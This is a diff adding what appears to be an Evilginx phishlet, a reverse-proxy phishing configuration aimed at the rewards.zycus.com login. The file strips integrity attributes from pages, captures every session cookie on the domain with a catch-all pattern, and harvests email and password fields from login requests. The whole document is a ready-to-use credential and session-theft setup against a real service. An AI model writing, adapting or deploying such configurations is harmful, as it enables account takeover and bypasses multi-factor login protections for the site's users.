@@ -1,0 +1,32 @@
+name: 'rewards.zycus.com'
+author: "@manan"
+min_ver: '3.2.0'
+redirect_url: 'https://rewards.zycus.com'
+proxy_hosts:
+  - {phish_sub: 'rewards', orig_sub: 'rewards', domain: 'zycus.com', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: 'rewards.zycus.com', orig_sub: 'rewards', domain: 'zycus.com', search: '"https:\/\/[^\.]+\.rewards\.zycus\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'rewards.zycus.com', orig_sub: 'rewards', domain: 'zycus.com', search: 'integrity="[^"]*"', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'rewards.zycus.com', orig_sub: 'rewards', domain: 'zycus.com', search: 'integrity=''[^'']*''', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+
+auth_urls:
+  - '/dashboard-engage.php'
+
+auth_tokens:
+  - domain: '.rewards.zycus.com'
+    keys: [".*,regexp"]
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'rewards.zycus.com'
+  path: '/login.php'
